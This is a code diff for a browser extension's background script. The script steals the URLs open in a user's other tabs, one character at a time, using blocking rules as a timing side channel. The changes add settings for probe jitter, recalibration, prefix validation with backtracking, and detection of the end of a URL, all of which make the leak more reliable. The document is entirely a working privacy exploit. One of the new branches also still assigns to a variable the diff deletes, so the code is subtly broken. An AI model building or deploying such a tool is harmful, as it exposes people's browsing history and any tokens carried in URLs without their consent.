@@ -1,5 +1,5 @@
 const TIMEOUT_MS  = 5000;
-const MAX_LEN     = 128;
+let maxLen        = 128;  // configurable from popup
 
 const escRe = s => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
 const escCC = c => c.replace(/[-\\\]^]/g, "\\$&");
@@ -31,7 +31,7 @@ const publishStatus = () => {
             tabId:       currentLeakTabId,
             prefix:      currentLeakScheme ? currentLeakScheme + currentLeakPrefix : currentLeakPrefix,
             charPos:     currentLeakPrefix.length,
-            maxLen:      MAX_LEN,
+            maxLen:      maxLen,
             queueLen:    queue.length + waitingForBackground.size,
             ts:          Date.now()
         }
@@ -167,17 +167,39 @@ const calibrate = async (tabId) => {
     publishStatus();
 };
 
-const AMBIG_FACTOR = 0.4;  // ambiguous band: threshold × [1-f … 1+f]
-const MAX_VOTES    = 3;
+const AMBIG_FACTOR_DEFAULT = 0.4;
+let ambigFactor  = AMBIG_FACTOR_DEFAULT; // configurable from popup
+const MAX_VOTES  = 3;
+// Inter-probe jitter: configurable from the popup. A random wait between
+// [jitterMin, jitterMax] ms is inserted before each reload.
+let jitterEnabled = false; // configurable from popup
+let jitterMin = 400;   // ms — updated from storage
+let jitterMax = 1200;  // ms — updated from storage
+// Recalibrate every this many leaked characters to catch oracle drift.
+let recalibrateEvery = 20;  // configurable from popup
+// Validate the accumulated prefix every this many characters to catch
+// corruption caused by timing noise or bot-detection redirects.
+let validateEvery = 15;     // configurable from popup
+let backtrackLen  = 5;      // chars to trim when prefix validation fails
+// Number of consecutive catch-all misses required before accepting end-of-URL.
+// Higher = less likely to terminate early on a noisy probe; lower = faster.
+let nullConfirmRounds = 3;  // configurable from popup
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const jitter = () => jitterEnabled
+    ? sleep(jitterMin + Math.random() * Math.max(0, jitterMax - jitterMin))
+    : Promise.resolve();
 
 const blockedBy = async (regex, tabId) => {
     if (abortLeak) return false;
     await setBlock(regex);
 
-    const lo = blockThreshold * (1 - AMBIG_FACTOR);
-    const hi = blockThreshold * (1 + AMBIG_FACTOR);
+    const lo = ambigFactor > 0 ? blockThreshold * (1 - ambigFactor) : blockThreshold;
+    const hi = ambigFactor > 0 ? blockThreshold * (1 + ambigFactor) : blockThreshold;
     let blocks = 0, votes = 0;
     for (let i = 0; i < MAX_VOTES; i++) {
+        if (abortLeak) return false;
+        await jitter();
         if (abortLeak) return false;
         // Pass hi as the early-exit cutoff: as soon as elapsed > hi we know
         // the URL was allowed, so there's no need to wait for the full load.
@@ -225,6 +247,15 @@ const makeProbeRe = (scheme, prefix, charClass) => {
     // prefix (which are in the post-scheme part of the URL), then the class.
     const tail = escRe(prefix.slice(-TAIL_LEN));
     return `^${escRe(scheme)}.*${tail}${charClass}`;
+};
+
+// Validates that the accumulated prefix still matches the live URL.
+// Probes whether the URL starts with scheme and contains the tail of prefix.
+// Returns false if the oracle no longer fires, indicating prefix corruption.
+const makePrefixCheckRe = (scheme, prefix) => {
+    const full = scheme + prefix;
+    if (full.length <= TAIL_LEN) return `^${escRe(full)}`;
+    return `^${escRe(scheme)}.*${escRe(prefix.slice(-TAIL_LEN))}`;
 };
 
 const leakChar = async (scheme, prefix, tabId) => {
@@ -286,10 +317,12 @@ const leak = async (tabId) => {
         }
     }
 
-    let sameCount = 0, prev = out.length > 0 ? out[out.length - 1] : null;
+    const initialLen = out.length;
+    let nullStreak = 0;   // consecutive positions where leakChar returned null
+    let prev = out.length > 0 ? out[out.length - 1] : null;
     currentLeakScheme = scheme;
     currentLeakPrefix = out;
-    for (let i = out.length; i < MAX_LEN; i++) {
+    for (let i = out.length; i < maxLen; i++) {
         if (abortLeak) {
             // Save progress for later resume (unless the tab was closed)
             if (!closingTabs.has(tabId)) {
@@ -298,6 +331,43 @@ const leak = async (tabId) => {
             }
             break;
         }
+        const charsLeaked = out.length - initialLen;
+        // Periodic recalibration every recalibrateEvery confirmed characters.
+        if (recalibrateEvery > 0 && charsLeaked > 0 && charsLeaked % recalibrateEvery === 0) {
+            console.log(`[*] Recalibrating at position ${out.length}...`);
+            await clearRules();
+            await calibrate(tabId);
+            if (abortLeak) {
+                if (!closingTabs.has(tabId))
+                    partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
+                break;
+            }
+        }
+        // Periodic prefix validation: confirm the accumulated prefix still
+        // matches the real URL. Catches corruption from noise or bot-detection
+        // redirects that change the page the oracle sees.
+        if (validateEvery > 0 && charsLeaked > 0 && charsLeaked % validateEvery === 0) {
+            console.log(`[*] Validating prefix at "${scheme}${out}"...`);
+            const prefixOk = await blockedBy(makePrefixCheckRe(scheme, out), tabId);
+            if (!prefixOk && !abortLeak) {
+                console.warn(`[!] Prefix validation failed — recalibrating and backtracking ${backtrackLen} chars`);
+                await clearRules();
+                await calibrate(tabId);
+                if (abortLeak) {
+                    if (!closingTabs.has(tabId))
+                        partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
+                    break;
+                }
+                const trim = Math.min(backtrackLen, out.length);
+                out = out.slice(0, -trim);
+                currentLeakPrefix = out;
+                i = out.length - 1; // for-loop will increment to out.length
+                prev = out.length > 0 ? out[out.length - 1] : null;
+                sameCount = 0;
+                continue;
+            }
+        }
+
         const c = await leakChar(scheme, out, tabId);
         if (abortLeak) {
             if (!closingTabs.has(tabId)) {
@@ -307,18 +377,31 @@ const leak = async (tabId) => {
             break;
         }
         if (!c) {
-            // leakChar can return null due to timing noise even when more characters
-            // remain. Confirm with a full-alphabet probe before terminating.
+            // Increment the null streak and confirm with a catch-all probe.
+            // Only terminate when nullConfirmRounds consecutive attempts all
+            // produce no character AND the catch-all probe also returns false.
+            nullStreak++;
             const anyMore = await blockedBy(makeProbeRe(scheme, out, cls(SORTED)), tabId);
             if (!abortLeak && anyMore) {
-                console.log(`[~] False null at position ${i} — retrying leakChar`);
-                i--; // for-loop will increment back to i, retrying this position
+                // Catch-all fired — real character exists but binary search
+                // narrowed incorrectly due to noise. Reset streak and retry.
+                console.log(`[~] Noisy null at position ${out.length} (streak ${nullStreak}) — catch-all fired, retrying`);
+                nullStreak = 0;
+                i--;
                 continue;
             }
+            if (!abortLeak && nullStreak < nullConfirmRounds) {
+                // Catch-all silent but haven't reached the required streak yet.
+                console.log(`[~] Null streak ${nullStreak}/${nullConfirmRounds} at position ${out.length} — retrying`);
+                i--;
+                continue;
+            }
+            // Reached nullConfirmRounds consecutive misses with no catch-all —
+            // accept as genuine end-of-URL.
+            console.log(`[*] End-of-URL confirmed after ${nullStreak} consecutive null probes`);
             break;
         }
-        sameCount = (c === prev) ? sameCount + 1 : 0;
-        if (sameCount >= 3) break;
+        nullStreak = 0;
         out += c;
         currentLeakPrefix = out;
         publishStatus();
@@ -328,7 +411,20 @@ const leak = async (tabId) => {
     await clearRules();
     currentLeakScheme = null;
     currentLeakPrefix = "";
-    return abortLeak ? "" : scheme + out;
+    if (abortLeak || !out) return abortLeak ? "" : scheme + out;
+
+    // Final end-of-URL verification: confirm the full leaked string is anchored
+    // to the real URL. If this fails, the last characters may be noise —
+    // trim back one at a time until the prefix validates or we run out.
+    let verified = await blockedBy(makePrefixCheckRe(scheme, out), tabId);
+    while (!verified && out.length > 0 && !abortLeak) {
+        console.warn(`[!] Final verification failed at length ${out.length} — trimming last char`);
+        out = out.slice(0, -1);
+        if (!out) break;
+        verified = await blockedBy(makePrefixCheckRe(scheme, out), tabId);
+    }
+    await clearRules();
+    return scheme + out;
 };
 
 // --- Encryption (AES-GCM via Web Crypto API) ---
@@ -390,9 +486,19 @@ const leakedTabs = new Set();
 // Tabs that were closed while being actively leaked — don't save partial progress for these
 const closingTabs = new Set();
 
-// Listen for pause/resume commands from the popup
+// Listen for setting changes from the popup
 chrome.storage.onChanged.addListener((changes, area) => {
-    if (area !== "local" || !("isPaused" in changes)) return;
+    if (area !== "local") return;
+    if ("jitterEnabled" in changes) jitterEnabled = !!changes.jitterEnabled.newValue;
+    if ("jitterMin"     in changes) jitterMin     = Math.max(0, Number(changes.jitterMin.newValue)     || 0);
+    if ("jitterMax"     in changes) jitterMax     = Math.max(0, Number(changes.jitterMax.newValue)     || 0);
+    if ("maxLen"            in changes) maxLen          = Math.max(1, Number(changes.maxLen.newValue)            || 128);
+    if ("ambigFactor"       in changes) ambigFactor     = Math.max(0, Number(changes.ambigFactor.newValue)       || 0);
+    if ("recalibrateEvery"  in changes) recalibrateEvery = Math.max(0, Number(changes.recalibrateEvery.newValue)  || 0);
+    if ("validateEvery"     in changes) validateEvery   = Math.max(0, Number(changes.validateEvery.newValue)     || 0);
+    if ("backtrackLen"      in changes) backtrackLen    = Math.max(0, Number(changes.backtrackLen.newValue)      || 0);
+    if ("nullConfirmRounds" in changes) nullConfirmRounds = Math.max(1, Number(changes.nullConfirmRounds.newValue) || 1);
+    if (!("isPaused" in changes)) return;
     globalPaused = changes.isPaused.newValue;
     if (globalPaused) {
         if (currentLeakTabId !== null) abortLeak = true;
@@ -553,10 +659,23 @@ chrome.tabs.onActivated.addListener(({ tabId }) => {
     publishStatus();
 });
 
-// On startup, restore paused state then queue background tabs (default: paused)
-chrome.storage.local.get("isPaused", ({ isPaused }) => {
+// On startup, restore paused state and all configurable settings
+chrome.storage.local.get(
+    ["isPaused", "jitterEnabled", "jitterMin", "jitterMax", "maxLen", "ambigFactor",
+     "recalibrateEvery", "validateEvery", "backtrackLen", "nullConfirmRounds"],
+    ({ isPaused, jitterEnabled: jEn, jitterMin: jMin, jitterMax: jMax, maxLen: mLen, ambigFactor: af,
+       recalibrateEvery: rce, validateEvery: ve, backtrackLen: bl, nullConfirmRounds: ncr }) => {
     globalPaused = isPaused !== false; // default to true if never set
-    if (isPaused === undefined) chrome.storage.local.set({ isPaused: true });
+    if (isPaused   === undefined) chrome.storage.local.set({ isPaused: true });
+    if (jEn        !== undefined) jitterEnabled    = !!jEn;
+    if (jMin       !== undefined) jitterMin        = jMin;
+    if (jMax       !== undefined) jitterMax        = jMax;
+    if (mLen       !== undefined) maxLen           = Math.max(1, mLen);
+    if (af         !== undefined) ambigFactor      = Math.max(0, af);
+    if (rce        !== undefined) recalibrateEvery = Math.max(0, rce);
+    if (ve         !== undefined) validateEvery    = Math.max(0, ve);
+    if (bl         !== undefined) backtrackLen     = Math.max(0, bl);
+    if (ncr        !== undefined) nullConfirmRounds = Math.max(1, ncr);
     chrome.tabs.query({}).then(tabs => {
         const bgTabs = tabs.filter(t => !t.active);
         console.log(`[*] Found ${bgTabs.length} background tab(s), queueing... (paused=${globalPaused})`);
